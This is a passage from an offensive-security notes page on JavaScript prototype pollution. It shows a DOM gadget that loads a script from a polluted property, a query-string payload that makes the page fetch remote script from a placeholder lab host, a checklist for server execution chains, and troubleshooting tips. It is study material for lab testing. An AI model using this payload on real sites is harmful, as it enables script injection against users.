+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">const</span> config <span style="color:#81a1c1">=</span> <span style="color:#eceff4">{};</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span>config<span style="color:#eceff4">.</span>transport_url<span style="color:#eceff4">)</span> <span style="color:#eceff4">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#81a1c1;font-weight:bold">const</span> s <span style="color:#81a1c1">=</span> <span style="color:#81a1c1">document</span><span style="color:#eceff4">.</span>createElement<span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;script&#39;</span><span style="color:#eceff4">);</span>
+</span></span><span style="display:flex;"><span>  s<span style="color:#eceff4">.</span>src <span style="color:#81a1c1">=</span> config<span style="color:#eceff4">.</span>transport_url<span style="color:#eceff4">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#81a1c1">document</span><span style="color:#eceff4">.</span>head<span style="color:#eceff4">.</span>appendChild<span style="color:#eceff4">(</span>s<span style="color:#eceff4">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#eceff4">}</span></span></span></code></pre></div><p>If <code>transport_url</code> is read from a polluted prototype, this application may load a script from a supplied permitted host:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>?__proto__[transport_url]=https://YOUR-LAB-HOST/proof.js</span></span></code></pre></div><p>The property name must match a real gadget. A script URL must be usable under CSP and fetched at the correct point in the lifecycle. URL parsing may consume the pollution only after gadget initialization; refresh/reorder the flow when source supports it.</p>
+<h2 id="7-server-execution-chains-are-runtime-specific">7. Server execution chains are runtime-specific<a class="anchor" href="#7-server-execution-chains-are-runtime-specific"></a></h2>
+<p>Node subprocess options, template compiler options and module-loading configuration can become gadgets in specific versions. Merely setting <code>shell</code>, <code>NODE_OPTIONS</code> or <code>execArgv</code> on a prototype does not establish execution.</p>
+<p>Record all prerequisites before attempting a chain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Pollution function and dependency version:
+</span></span><span style="display:flex;"><span>Shared or per-object prototype:
+</span></span><span style="display:flex;"><span>Property read and whether own value shadows it:
+</span></span><span style="display:flex;"><span>Actual child_process/template/loader call:
+</span></span><span style="display:flex;"><span>Node and library version:
+</span></span><span style="display:flex;"><span>Options object construction:
+</span></span><span style="display:flex;"><span>Observable proof:</span></span></code></pre></div><p>A child process must actually be started, with an options object that inherits the relevant property. API defaults and hardened option handling change between Node versions. Use provided source/version rather than copying a historical RCE chain.</p>
+<h2 id="8-troubleshooting">8. Troubleshooting<a class="anchor" href="#8-troubleshooting"></a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Observation</th>
+          <th>Next check</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Key reflected, fresh object unchanged</td>
+          <td>Stored own property; no pollution proof</td>
+      </tr>
+      <tr>
+          <td><code>__proto__</code> rejected</td>
+          <td>Look for constructor path only if setter can traverse it</td>
+      </tr>
+      <tr>
+          <td>Marker works only on one object</td>
+          <td>Per-object prototype change</td>
+      </tr>
+      <tr>
+          <td>Marker works, privilege does not</td>
+          <td>Gadget absent, own property shadows, null-prototype object</td>
+      </tr>
+      <tr>
+          <td>First request works, later requests weird</td>
+          <td>Process-wide state persisted; reset your local instance</td>
+      </tr>
+      <tr>
+          <td>Browser clean, server affected</td>
+          <td>Separate JavaScript runtimes</td>
+      </tr>
+      <tr>
+          <td>Server restart loses effect</td>
+          <td>Expected in-memory mutation</td>
+      </tr>
+  </tbody>
+</table>
+<p>Remove the test marker from your local runtime after recording evidence:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">delete</span> <span style="color:#81a1c1">Object</span><span style="color:#eceff4">.</span>prototype<span style="color:#eceff4">.</span>ctfMarker731<span style="color:#eceff4">;</span></span></span></code></pre></div><p>That cleanup only affects the current runtime. It cannot remotely reset a shared server. Related: <a href="../xss/">XSS</a>, <a href="../auth-idor/">Auth / IDOR</a>.</p>
+<h2 id="tool-workflow">Tool workflow<a class="anchor" href="#tool-workflow"></a></h2>
+<p>Use <a href="../../ajcbbc_allow_tools/burp_suite_community/">Burp Community Repeater</a> for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof.</p>
+<h2 id="references">References<a class="anchor" href="#references"></a></h2>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution">MDN prototype pollution</a>, <a href="https://portswigger.net/web-security/prototype-pollution">PortSwigger prototype pollution</a>, <a href="https://nodejs.org/api/child_process.html">Node child_process API</a>.</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/web-expl/oauth/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>OAuth / Account Linking</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/web-expl/graphql/" class="flex align-center">
+        <span>GraphQL · Schema to Resolver</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        <div class="field-footer"><span>offsec-n0t3 <span aria-hidden="true">//</span> keep your findings close.</span><a href="#field-content">BACK TO TOP ↑</a></div>
+
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-where-to-look">1. Where to look</a></li>
+    <li><a href="#2-non-destructive-marker-first">2. Non-destructive marker first</a></li>
+    <li><a href="#3-client-side-proof">3. Client-side proof</a></li>
+    <li><a href="#4-server-side-proof-needs-observable-application-behavior">4. Server-side proof needs observable application behavior</a></li>
+    <li><a href="#5-authorization-gadget">5. Authorization gadget</a></li>
+    <li><a href="#6-client-dom-gadget">6. Client DOM gadget</a></li>
+    <li><a href="#7-server-execution-chains-are-runtime-specific">7. Server execution chains are runtime-specific</a></li>
+    <li><a href="#8-troubleshooting">8. Troubleshooting</a></li>
+    <li><a href="#tool-workflow">Tool workflow</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  <a class="skip-link" href="#field-content">Skip to notes</a>
+<div class="reading-progress" aria-hidden="true"></div>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
